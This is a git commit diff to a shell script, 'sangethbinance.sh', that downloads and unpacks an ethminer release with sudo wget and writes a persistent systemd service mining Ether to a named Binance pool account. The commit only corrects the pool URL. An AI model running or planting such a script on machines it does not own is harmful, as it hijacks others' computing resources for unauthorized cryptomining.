d04262f56c04dc28f6c0f4b3c036168ebc163433
trangtrau <30510221+trangtrau@users.noreply.github.com>
2022-03-11 03:47:00 +0700

    Update sangethbinance.sh

--- sangethbinance.sh
+++ sangethbinance.sh
@@ -17,7 +17,7 @@ then
 	sudo apt-get install libcurl3 -y
 	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://trangtrau.001@stratum+tcp://ethash.poolbinance.com:25 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
+	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://trangtrau.001@ethash.poolbinance.com:25 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
 	rm -rf name
 	date "+%H%M-%d%m" >> name
 	index=`cat "name"`
